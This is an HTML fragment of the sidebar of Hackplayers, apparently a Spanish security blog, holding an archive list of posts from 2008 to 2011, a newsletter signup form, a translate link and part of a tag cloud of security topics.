<a class='post-count-link' href='http://www.hackplayers.com/2011/07/'>
julio
</a>
<span class='post-count' dir='ltr'>
                            (
                            12
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1306879200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2011/06/'>
junio
</a>
<span class='post-count' dir='ltr'>
                            (
                            23
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1304200800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2011/05/'>
mayo
</a>
<span class='post-count' dir='ltr'>
                            (
                            23
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1301608800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2011/04/'>
abril
</a>
<span class='post-count' dir='ltr'>
                            (
                            19
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1298934000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2011/03/'>
marzo
</a>
<span class='post-count' dir='ltr'>
                            (
                            18
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1296514800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2011/02/'>
febrero
</a>
<span class='post-count' dir='ltr'>
                            (
                            15
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1293836400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2011/01/'>
enero
</a>
<span class='post-count' dir='ltr'>
                            (
                            25
                            )
                          </span>
</li>
</ul>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=YEARLY-1262300400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2010/'>
2010
</a>
<span class='post-count' dir='ltr'>
                            (
                            189
                            )
                          </span>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1291158000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2010/12/'>
diciembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            24
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1288566000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2010/11/'>
noviembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            17
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1285884000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2010/10/'>
octubre
</a>
<span class='post-count' dir='ltr'>
                            (
                            16
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1283292000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2010/09/'>
septiembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            14
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1280613600000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2010/08/'>
agosto
</a>
<span class='post-count' dir='ltr'>
                            (
                            12
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1277935200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2010/07/'>
julio
</a>
<span class='post-count' dir='ltr'>
                            (
                            18
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1275343200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2010/06/'>
junio
</a>
<span class='post-count' dir='ltr'>
                            (
                            17
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1272664800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2010/05/'>
mayo
</a>
<span class='post-count' dir='ltr'>
                            (
                            12
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1270072800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2010/04/'>
abril
</a>
<span class='post-count' dir='ltr'>
                            (
                            11
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1267398000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2010/03/'>
marzo
</a>
<span class='post-count' dir='ltr'>
                            (
                            14
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1264978800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2010/02/'>
febrero
</a>
<span class='post-count' dir='ltr'>
                            (
                            17
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1262300400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2010/01/'>
enero
</a>
<span class='post-count' dir='ltr'>
                            (
                            17
                            )
                          </span>
</li>
</ul>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=YEARLY-1230764400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2009/'>
2009
</a>
<span class='post-count' dir='ltr'>
                            (
                            84
                            )
                          </span>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1259622000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2009/12/'>
diciembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            17
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1257030000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2009/11/'>
noviembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            2
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1254348000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2009/10/'>
octubre
</a>
<span class='post-count' dir='ltr'>
                            (
                            5
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1251756000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2009/09/'>
septiembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            8
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1249077600000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2009/08/'>
agosto
</a>
<span class='post-count' dir='ltr'>
                            (
                            5
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1246399200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2009/07/'>
julio
</a>
<span class='post-count' dir='ltr'>
                            (
                            9
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1243807200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2009/06/'>
junio
</a>
<span class='post-count' dir='ltr'>
                            (
                            4
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1241128800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2009/05/'>
mayo
</a>
<span class='post-count' dir='ltr'>
                            (
                            7
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1238536800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2009/04/'>
abril
</a>
<span class='post-count' dir='ltr'>
                            (
                            7
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1235862000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2009/03/'>
marzo
</a>
<span class='post-count' dir='ltr'>
                            (
                            7
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1233442800000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2009/02/'>
febrero
</a>
<span class='post-count' dir='ltr'>
                            (
                            8
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1230764400000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2009/01/'>
enero
</a>
<span class='post-count' dir='ltr'>
                            (
                            5
                            )
                          </span>
</li>
</ul>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=YEARLY-1199142000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2008/'>
2008
</a>
<span class='post-count' dir='ltr'>
                            (
                            19
                            )
                          </span>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1228086000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2008/12/'>
diciembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            3
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1225494000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2008/11/'>
noviembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            4
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1222812000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2008/10/'>
octubre
</a>
<span class='post-count' dir='ltr'>
                            (
                            1
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1220220000000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2008/09/'>
septiembre
</a>
<span class='post-count' dir='ltr'>
                            (
                            4
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1217541600000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2008/08/'>
agosto
</a>
<span class='post-count' dir='ltr'>
                            (
                            1
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1214863200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2008/07/'>
julio
</a>
<span class='post-count' dir='ltr'>
                            (
                            4
                            )
                          </span>
</li>
</ul>
<ul>
<li class='archivedate collapsed'>
<a class='toggle' href='//www.hackplayers.com/?widgetType=BlogArchive&widgetId=BlogArchive1&action=toggle&dir=open&toggle=MONTHLY-1212271200000&toggleopen=MONTHLY-1519858800000'>
<span class='zippy'>

                              &#9658;
                            
</span>
</a>
<a class='post-count-link' href='http://www.hackplayers.com/2008/06/'>
junio
</a>
<span class='post-count' dir='ltr'>
                            (
                            2
                            )
                          </span>
</li>
</ul>
</li>
</ul>
</div>
</div>
<div class='clear'></div>
<span class='widget-item-control'>
<span class='item-control blog-admin'>
<a class='quickedit' href='//www.blogger.com/rearrange?blogID=9133539773684103848&widgetType=BlogArchive&widgetId=BlogArchive1&action=editWidget&sectionId=sidebar' onclick='return _WidgetManager._PopupConfig(document.getElementById("BlogArchive1"));' target='configBlogArchive1' title='Editar'>
<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
</a>
</span>
</span>
<div class='clear'></div>
</div>
</div><div class='widget HTML' data-version='1' id='HTML1'>
<h2 class='title'>
Newsletter
</h2>
<div class='widget-content'>
<form onsubmit="window.open('http://feedburner.google.com/fb/a/mailverify?uri=Hackplayers', 'popupwindow', 'scrollbars=yes,width=550,height=520');return true" target="popupwindow" method="post" action="http://feedburner.google.com/fb/a/mailverify" style="width: 235px; height: 246px; background-image: url('http://1.bp.blogspot.com/_BUD45TwOpHY/TQ9697cc8TI/AAAAAAAABG8/4nXBTunsMAo/S250/sombra_samurai_hpys.jpg'); border: 1px solid rgb(204, 204, 204); padding: 3px; text-align: center;">
  <p style="font-family: Verdana;"><span style="font-size: 8pt;">Recibe las últimas novedades del blog en tu e-mail:</span></p>
  <p>
    <input type="text" name="email" style="width: 140px;" />
    <input type="hidden" name="uri" value="Hackplayers" />
    <input type="hidden" value="es_ES" name="loc" />
    <input type="submit" value="Subscribe" /></p>
</form>
<p align="left">
<a href="javascript:var t=((window.getSelection&&window.getSelection())||(document.getSelection&&document.getSelection())||(document.selection &&document.selection.createRange&&document.selection.createRange().text));var e=(document.charset||document.characterSet);if(t!=''){location.href='http://translate.google.com/translate_t?text='+t+'&hl=en&langpair=es|en&tbb=1&ie='+e;}else{location.href='http://translate.google.com/translate?u='+escape(location.href)+'&hl=en&langpair=es|en&tbb=1&ie='+e;};">
Translate to English</a></p>
</div>
<div class='clear'></div>
<span class='widget-item-control'>
<span class='item-control blog-admin'>
<a class='quickedit' href='//www.blogger.com/rearrange?blogID=9133539773684103848&widgetType=HTML&widgetId=HTML1&action=editWidget&sectionId=sidebar' onclick='return _WidgetManager._PopupConfig(document.getElementById("HTML1"));' target='configHTML1' title='Editar'>
<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
</a>
</span>
</span>
<div class='clear'></div>
</div><div class='widget Label' data-version='1' id='Label1'>
<h2>
Etiquetas
</h2>
<div class='widget-content cloud-label-widget-content'>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/.NET'>
.NET
</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/0%20day'>
0 day
</a>
</span>
<span class='label-size label-size-4'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/amenazas'>
amenazas
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/an%C3%A1lisis'>
análisis
</a>
</span>
<span class='label-size label-size-4'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/android'>
android
</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/anonimato'>
anonimato
</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/anonymous'>
anonymous
</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/antivirus'>
antivirus
</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/apple'>
apple
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/APT'>
APT
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/arduino'>
arduino
</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/backdoor'>
backdoor
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/backup'>
backup
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/bancos'>
bancos
</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/base%20de%20datos'>
base de datos
</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/bash'>
bash
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/biohacking'>
biohacking
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/bios'>
bios
</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/bitcoins'>
bitcoins
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/blue%20team'>
blue team
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/bluetooth'>
bluetooth
</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/bof'>
bof
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/botnet'>
botnet
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/brechas'>
brechas
</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/bug%20bounty'>
bug bounty
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/bullying'>
bullying
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/burp'>
burp
</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/bypass'>
bypass
</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/C'>
C
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/C%23'>
C#
</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/captchas'>
captchas
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/car%20hacking'>
car hacking
</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/censura'>
censura
</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/certificaciones'>
certificaciones
</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/charlas'>
charlas
</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/cheatsheets'>
cheatsheets
</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/cibercrimen'>
cibercrimen
</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/ciberguerra'>
ciberguerra
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/ciberseguridad%20industrial'>
ciberseguridad industrial
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/ciencia'>
ciencia
</a>
</span>
<span class='label-size label-size-4'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/cifrado'>
cifrado
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/cloud'>
cloud
</a>
</span>
<span class='label-size label-size-4'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/c%C3%B3digo%20abierto'>
código abierto
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/comunicacion'>
comunicacion
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/comunidad'>
comunidad
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/concienciaci%C3%B3n'>
concienciación
</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/concursos'>
concursos
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/condici%C3%B3n%20de%20carrera'>
condición de carrera
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/contenedores'>
contenedores
</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/contramedidas'>
contramedidas
</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/contrase%C3%B1as'>
contraseñas
</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/contribuciones'>
contribuciones
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/control%20parental'>
control parental
</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/cracking'>
cracking
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/credenciales'>
credenciales
</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/criptograf%C3%ADa'>
criptografía
</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/crowdfunding'>
crowdfunding
</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/ctf'>
ctf
</a>
</span>
<span class='label-size label-size-4'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/curiosidades'>
curiosidades
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/cyberpunk'>
cyberpunk
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/cyberwar'>
cyberwar
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/DA'>
DA
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/dark%20web'>
dark web
</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/Deep%20Web'>
Deep Web
</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/defaces'>
defaces
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/dfir'>
dfir
</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/dns'>
dns
</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/docker'>
docker
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/documentales'>
documentales
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/dom%C3%B3tica'>
domótica
</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/dorks'>
dorks
</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='http://www.hackplayers.com/search/label/dos'>
dos
</a>
</span>
<span class='label-size label-size-2'>
